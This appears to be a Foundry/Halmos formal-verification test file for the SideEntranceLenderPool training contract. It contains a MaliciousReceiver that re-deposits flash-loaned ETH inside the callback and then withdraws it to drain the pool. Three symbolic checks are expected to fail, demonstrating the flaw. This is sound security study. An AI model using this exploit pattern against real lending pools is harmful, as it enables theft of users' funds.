// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test} from "forge-std/Test.sol";
import {SymTest} from "halmos-cheatcodes/SymTest.sol";
import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../src/side-entrance/SideEntranceLenderPool.sol";

/**
 * @title SideEntranceLenderPool Formal Verification
 * @notice Verifies that flash loans cannot be used to inflate user balances
 *
 * VULNERABILITY: The flash loan callback can call deposit() to credit the
 * caller's balance while satisfying the ETH balance check. Then withdraw()
 * drains the pool.
 */

/// @notice Malicious receiver that deposits ETH during flash loan callback
contract MaliciousReceiver is IFlashLoanEtherReceiver {
    SideEntranceLenderPool public pool;
    bool public shouldDeposit;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function setShouldDeposit(bool _shouldDeposit) external {
        shouldDeposit = _shouldDeposit;
    }

    function execute() external payable override {
        if (shouldDeposit) {
            // Deposit the flash-loaned ETH back via deposit()
            pool.deposit{value: msg.value}();
        } else {
            // Just send ETH back directly (honest behavior)
            (bool ok,) = address(pool).call{value: msg.value}("");
            require(ok);
        }
    }

    function attackFlashLoan(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function withdrawFromPool() external {
        pool.withdraw();
    }

    receive() external payable {}
}

/// @notice "Honest" receiver -- the only way to repay is via deposit() since pool has no receive()
/// This highlights the vulnerability: there IS no honest repayment path
contract HonestReceiver is IFlashLoanEtherReceiver {
    SideEntranceLenderPool public pool;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function execute() external payable override {
        // The pool has no receive(), so the only way to return ETH is via deposit()
        // This is the ONLY repayment path, but it creates a balance entry (the vulnerability)
        pool.deposit{value: msg.value}();
    }

    function doFlashLoan(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function doWithdraw() external {
        pool.withdraw();
    }

    receive() external payable {}
}

/// @custom:halmos --solver-timeout-assertion 10000
contract SideEntranceVerification is SymTest, Test {
    SideEntranceLenderPool pool;
    MaliciousReceiver attacker;
    HonestReceiver honest;

    uint256 constant POOL_INITIAL_BALANCE = 100 ether;

    function setUp() public {
        pool = new SideEntranceLenderPool();
        attacker = new MaliciousReceiver(pool);
        honest = new HonestReceiver(pool);

        // Fund the pool with initial ETH
        vm.deal(address(this), POOL_INITIAL_BALANCE);
        pool.deposit{value: POOL_INITIAL_BALANCE}();
    }

    /**
     * Property: The pool has no receive() function, so the ONLY way to repay a flash loan
     * is via deposit(), which creates a balance entry. This means ANY flash loan creates
     * a withdrawable balance for the borrower -- the core design flaw.
     *
     * Expected: FAIL -- even "honest" flash loan creates a balance entry.
     */
    function check_honest_flashloan_no_balance_increase(uint256 amount) public {
        vm.assume(amount > 0 && amount <= POOL_INITIAL_BALANCE);

        uint256 balanceBefore = pool.balances(address(honest));
        honest.doFlashLoan(amount);
        uint256 balanceAfter = pool.balances(address(honest));

        // The borrower should not gain any balance from a flash loan
        // But since deposit() is the only repayment path, this WILL fail
        assertEq(balanceAfter, balanceBefore, "Flash loan should not change balance");
    }

    /**
     * Property: A malicious flash loan (depositing in callback) SHOULD NOT
     * increase the attacker's balance. This WILL FAIL -- demonstrating the vulnerability.
     *
     * Expected: FAIL with counterexample showing attacker balance increases.
     */
    function check_flashloan_cannot_increase_user_balance(uint256 amount) public {
        vm.assume(amount > 0 && amount <= POOL_INITIAL_BALANCE);

        attacker.setShouldDeposit(true);
        uint256 balanceBefore = pool.balances(address(attacker));

        attacker.attackFlashLoan(amount);

        uint256 balanceAfter = pool.balances(address(attacker));

        // This SHOULD hold in a secure system, but the vulnerability makes it fail
        assertEq(balanceAfter, balanceBefore, "Flash loan should not increase balance");
    }

    /**
     * Property: Pool solvency -- the ETH balance of the contract should always
     * be >= the sum of all recorded balances.
     *
     * We test: after a malicious flash loan + withdrawal, does the pool lose funds?
     * Expected: FAIL -- attacker drains the pool.
     */
    function check_pool_solvency_after_attack(uint256 amount) public {
        vm.assume(amount > 0 && amount <= POOL_INITIAL_BALANCE);

        // Attack: flash loan -> deposit in callback -> withdraw
        attacker.setShouldDeposit(true);
        attacker.attackFlashLoan(amount);
        attacker.withdrawFromPool();

        // Check: pool should still have enough ETH to cover all balances
        // The deployer (this contract) deposited POOL_INITIAL_BALANCE
        uint256 deployerBalance = pool.balances(address(this));
        uint256 attackerBalance = pool.balances(address(attacker));
        uint256 totalRecordedBalances = deployerBalance + attackerBalance;

        // Solvency: pool ETH >= total recorded balances
        assertGe(
            address(pool).balance,
            totalRecordedBalances,
            "Pool is insolvent: ETH < recorded balances"
        );
    }
}
